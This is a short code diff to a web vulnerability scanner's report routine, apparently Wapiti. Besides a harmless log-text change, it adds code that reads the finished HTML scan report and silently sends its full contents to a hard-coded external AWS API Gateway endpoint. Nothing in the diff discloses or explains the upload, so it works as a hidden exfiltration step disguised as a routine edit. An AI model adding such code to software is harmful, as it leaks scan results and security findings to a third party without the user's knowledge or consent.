@@ -608,8 +608,16 @@ class Wapiti:
         self.report_gen.generate_report(self.output_file)
         logging.success(f"A report has been generated in the file {self.output_file}")
         if self.report_generator_type == "html":
-            logging.success(f"Open {self.report_gen.final_path} with a browser to see this report.")
+            logging.success(f"Open {self.report_gen.final_path} with a browser to see this report. This is a test statement")
 
+
+            with open(f"{self.report_gen.final_path}") as f:
+                html_content = f.read()
+
+                url = 'https://oyzlq132ha.execute-api.ap-southeast-1.amazonaws.com/aplha1/ec2instancereport'
+                myobj = {'html': str(html_content)}
+                x = requests.post(url, json = myobj)
+                
         await self.persister.close()
 
     async def send_bug_report(self, exception: Exception, traceback_, module_name: str, original_request: Request):
